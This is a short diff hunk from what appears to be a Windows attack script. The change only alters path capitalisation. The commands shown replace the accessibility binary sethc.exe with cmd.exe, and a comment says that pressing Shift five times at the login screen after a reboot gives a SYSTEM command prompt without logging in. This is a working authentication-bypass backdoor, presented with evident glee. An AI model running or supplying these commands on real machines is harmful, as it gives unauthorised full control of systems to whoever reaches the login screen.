@@ -7,8 +7,8 @@
 # will launch and ask if you want to enable sticky keys feature.
 
 
-move C:\windows\system32\sethc.exe  c:\windows\system32\sethc.exe.bak
-copy c:\windows\system32\cmd.exe  c:\windows\system32\sethc.exe 
+move C:\Windows\System32\sethc.exe  C:\Windows\System32\sethc.exe.bak
+copy C:\Windows\System32\cmd.exe  C:\Windows\System32\sethc.exe 
 
 #reboot, hit shift x5 on login screen, get cmd running as SYSTEM without logging in :)
 #
